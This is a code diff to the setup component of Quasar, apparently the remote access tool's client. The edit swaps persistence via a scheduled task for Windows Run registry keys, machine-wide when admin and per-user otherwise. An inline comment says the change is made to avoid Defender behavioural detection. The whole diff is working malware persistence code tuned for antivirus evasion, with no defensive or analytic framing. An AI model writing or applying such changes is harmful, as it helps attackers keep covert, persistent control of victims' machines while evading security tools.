@@ -1,4 +1,4 @@
-﻿using Microsoft.Win32;
+using Microsoft.Win32;
 using Quasar.Client.Helper;
 using Quasar.Common.Enums;
 using System.Diagnostics;
@@ -11,42 +11,33 @@ namespace Quasar.Client.Setup
         {
             if (UserAccount.Type == AccountType.Admin)
             {
-                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
-                {
-                    Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath +
-                                "\" /rl HIGHEST /f",
-                    UseShellExecute = false,
-                    CreateNoWindow = true
-                };
-
-                Process p = Process.Start(startInfo);
-                p.WaitForExit(1000);
-                if (p.ExitCode == 0) return;
+                // Use HKLM registry (machine-wide, survives all user logons)
+                // Avoids schtasks which triggers Defender behavioral detection
+                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
+                    true);
             }
-
-            RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
-                true);
+            else
+            {
+                // Non-admin: use HKCU registry (current user only)
+                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
+                    true);
+            }
         }
 
         public void RemoveFromStartup(string startupName)
         {
             if (UserAccount.Type == AccountType.Admin)
             {
-                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
-                {
-                    Arguments = "/delete /tn \"" + startupName + "\" /f",
-                    UseShellExecute = false,
-                    CreateNoWindow = true
-                };
-
-                Process p = Process.Start(startInfo);
-                p.WaitForExit(1000);
-                if (p.ExitCode == 0) return;
+                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
             }
-
-            RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
-                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
+            else
+            {
+                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
+            }
         }
     }
 }
